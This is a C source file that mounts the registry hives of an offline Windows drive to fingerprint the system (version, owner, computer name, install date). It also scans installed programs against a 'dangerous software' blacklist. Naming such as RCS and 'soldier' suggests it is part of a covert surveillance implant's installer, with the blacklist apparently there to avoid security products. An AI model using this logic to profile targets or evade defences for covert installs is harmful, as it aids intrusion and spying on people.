#include "stdafx.h"
#include "commons.h"
#include "Functions_OS.h"
#include "Functions_Users.h"
#include "Functions_RCS.h"

BOOL Time1970ToSystemTime(DWORD toffset, SYSTEMTIME *sys_time)
{
	SYSTEMTIME age_time_s;
	FILETIME age_time_f;
	ULARGE_INTEGER nanosec_time, nanosec_offset;

	memset(&age_time_s, 0, sizeof(age_time_s));
	age_time_s.wDay = 1;
	age_time_s.wMonth = 1;
	age_time_s.wYear = 1970;
	if (!SystemTimeToFileTime(&age_time_s, &age_time_f))
		return FALSE;

	nanosec_offset.QuadPart = (unsigned int)toffset;
	nanosec_offset.QuadPart *= 10000000;

	nanosec_time.HighPart = age_time_f.dwHighDateTime;
	nanosec_time.LowPart = age_time_f.dwLowDateTime;
	nanosec_time.QuadPart += nanosec_offset.QuadPart;

	age_time_f.dwHighDateTime = nanosec_time.HighPart;
	age_time_f.dwLowDateTime = nanosec_time.LowPart;

	return FileTimeToSystemTime(&age_time_f, sys_time);
}

DWORD WIN_GetArch(os_struct_t *os_info)
{
	WCHAR wow64_path[MAX_PATH];
	HANDLE hfile;

	swprintf_s(wow64_path, MAX_PATH, L"%s%s", os_info->drive, L"windows\\syswow64\\");
	hfile = CreateFile(wow64_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		return 64;
	}

	return 32;
}

BOOL WIN_IsSupported(os_struct_t *os_info)
{
	if ( !wcscmp(os_info->curr_ver, L"5.0") || // Windows 2000
		 !wcscmp(os_info->curr_ver, L"5.1") || // Windows XP
		 !wcscmp(os_info->curr_ver, L"5.2") || // Windows 2003
		 !wcscmp(os_info->curr_ver, L"6.0") || // Windows Vista o 2008
		 !wcscmp(os_info->curr_ver, L"6.1") || // Windows 7
		 !wcscmp(os_info->curr_ver, L"6.2") || // Windows 8
		 !wcscmp(os_info->curr_ver, L"6.3"))   // Windows 8.1
		return TRUE;

	return FALSE;
}

// Se c'e' un software pericoloso torna uno dei seguenti valori
// #define BL_BLACKLISTED 0
// #define BL_SAFE 1
// #define BL_ALLOWSOLDIER 2
DWORD WIN_IsBlackListedSoftware(os_struct_t *os_struct)
{
	HKEY hKeyUninstall = NULL, hKeyProgram = NULL;
	DWORD dwordval, index, len;
	WCHAR stringval[128], product[256];
	ULONG uSamDesidered = KEY_READ;
	WCHAR software_hive_path[MAX_PATH];
	WCHAR system_root[MAX_PATH];
	HANDLE hfile;
	DWORD i, t_ret;
	DWORD ret_val = BL_SAFE;

	ZeroMemory(os_struct->bl_software, sizeof(os_struct->bl_software));

	// Monta l'hive SOFTWARE
	swprintf_s(system_root, MAX_PATH, L"windows\\system32");
	swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", os_struct->drive, system_root, L"\\config\\software");
	
	hfile = CreateFile(software_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		swprintf_s(system_root, MAX_PATH, L"winnt\\system32");
		swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", os_struct->drive, system_root, L"\\config\\software");
		hfile = CreateFile(software_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hfile == INVALID_HANDLE_VALUE)
			return BL_BLACKLISTED;
	}
	CloseHandle(hfile);
	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\", software_hive_path) != ERROR_SUCCESS) 
		return BL_BLACKLISTED;
	
	// Al primo giro guarda quelli a 32 poi quelli a 64bit 
	for (i=0; i<2 && ret_val != BL_BLACKLISTED; i++) {
		do {
			index = 0;
			if (i == 0) {
				if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, uSamDesidered, &hKeyUninstall) != ERROR_SUCCESS) 
					break;
			} else {
				if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, uSamDesidered, &hKeyUninstall) != ERROR_SUCCESS) 
					break;
			}

			while(1) {
				if(hKeyProgram) {
					RegCloseKey(hKeyProgram);
					hKeyProgram = NULL;
				}

				len = sizeof(stringval) / sizeof(stringval[0]);
				if(RegEnumKeyExW(hKeyUninstall, index++, stringval, &len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

				if(RegOpenKeyExW(hKeyUninstall, stringval, 0, KEY_READ, &hKeyProgram) != ERROR_SUCCESS) continue;

				if(!RegQueryValueExW(hKeyProgram, L"ParentKeyName", NULL, NULL, NULL, NULL)) continue;

				len = sizeof(dwordval);
				if(!RegQueryValueExW(hKeyProgram, L"SystemComponent", NULL, NULL, (LPBYTE)&dwordval, &len) && (dwordval == 1)) continue;

				len = sizeof(stringval);
				if(RegQueryValueExW(hKeyProgram, L"DisplayName", NULL, NULL, (LPBYTE)stringval, &len)) continue;

				wcsncpy_s(product, sizeof(product) / sizeof(product[0]), stringval, _TRUNCATE);

				len = sizeof(stringval);
				if(!RegQueryValueExW(hKeyProgram, L"DisplayVersion", NULL, NULL, (LPBYTE)stringval, &len)) {
					wcsncat_s(product, sizeof(product) / sizeof(product[0]), L"   (", _TRUNCATE);
					wcsncat_s(product, sizeof(product) / sizeof(product[0]), stringval, _TRUNCATE);
					wcsncat_s(product, sizeof(product) / sizeof(product[0]), L")", _TRUNCATE);
				}

				t_ret = IsDangerousString(product, os_struct); 
				if (t_ret == BL_ALLOWSOLDIER) 
					ret_val = BL_ALLOWSOLDIER;				
				else if (t_ret == BL_BLACKLISTED) {
					ret_val = BL_BLACKLISTED;
					_snwprintf_s(os_struct->bl_software, sizeof(os_struct->bl_software)/sizeof(os_struct->bl_software[0]), _TRUNCATE, L"%s", product);
					break;
				}
			}
		} while(0);

		if(hKeyUninstall) {
			RegCloseKey(hKeyUninstall);
			hKeyUninstall = NULL;
		}
	}

	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\");
	return ret_val;
}

BOOL RecognizeWindowsOS(WCHAR *drive_letter, os_struct_t *os_struct)
{
	WCHAR software_hive_path[MAX_PATH];
	WCHAR system_hive_path[MAX_PATH];
	WCHAR system_root[MAX_PATH];
	HANDLE hfile;
	DWORD *temp_date;
	DWORD *temp_bias;

	// Vede se esiste l'hive (XP, Vista, 2000, etc.)
	// Cerca prima in \Windows e poi in \WinNT
	// Deve trovare sia SYSTEM che SOFTWARE per proseguire
	swprintf_s(system_root, MAX_PATH, L"windows\\system32");
	swprintf_s(system_hive_path, MAX_PATH, L"%s%s%s", drive_letter, system_root, L"\\config\\system");
	
	hfile = CreateFile(system_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		swprintf_s(system_root, MAX_PATH, L"winnt\\system32");
		swprintf_s(system_hive_path, MAX_PATH, L"%s%s%s", drive_letter, system_root, L"\\config\\system");
		hfile = CreateFile(system_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hfile == INVALID_HANDLE_VALUE)
			return FALSE;
	}
	CloseHandle(hfile);
	swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", drive_letter, system_root, L"\\config\\software");
	hfile = CreateFile(software_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
		return FALSE;
	CloseHandle(hfile);

	// Monta l'hive
	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\", system_hive_path) != ERROR_SUCCESS) 
		return FALSE;

	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\", software_hive_path) != ERROR_SUCCESS) {
		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\");
		return FALSE;
	}

	os_struct->os = WIN_OS;
	memcpy(os_struct->system_root, system_root, sizeof(system_root));
	ReadRegValue(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName", NULL, &(os_struct->product_name));
	ReadRegValue(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CSDVersion", NULL, &(os_struct->csd_version));
	ReadRegValue(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"RegisteredOwner", NULL, &(os_struct->reg_owner));
	ReadRegValue(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"RegisteredOrganization", NULL, &(os_struct->reg_org));
	ReadRegValue(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductId", NULL, &(os_struct->product_id));
	ReadRegValue(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentVersion", NULL, &(os_struct->curr_ver));

	ReadRegValue(L"RCS_SYSTEM\\ControlSet001\\Control\\ProductOptions", L"ProductType", NULL, &(os_struct->product_type));
	ReadRegValue(L"RCS_SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName", L"ComputerName", NULL, &(os_struct->computer_name));

	ReadRegValue(L"RCS_SYSTEM\\ControlSet001\\Control\\TimeZoneInformation", L"ActiveTimeBias", NULL, (WCHAR **)&temp_bias);
	if (temp_bias) {
		os_struct->time_bias = *temp_bias;
		SAFE_FREE(temp_bias);
	} else
		os_struct->time_bias = 0;

	ReadRegValue(L"RCS_SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"InstallDate", NULL, (WCHAR **)&temp_date);
	if (temp_date) {
		Time1970ToSystemTime(*temp_date, &(os_struct->install_date));
		SAFE_FREE(temp_date);
	}

	os_struct->arch = WIN_GetArch(os_struct);
	os_struct->is_supported = WIN_IsSupported(os_struct); // Va chiamata per ultima...

	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\");
	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\");

	os_struct->is_blacklisted = WIN_IsBlackListedSoftware(os_struct);

	return TRUE;
}
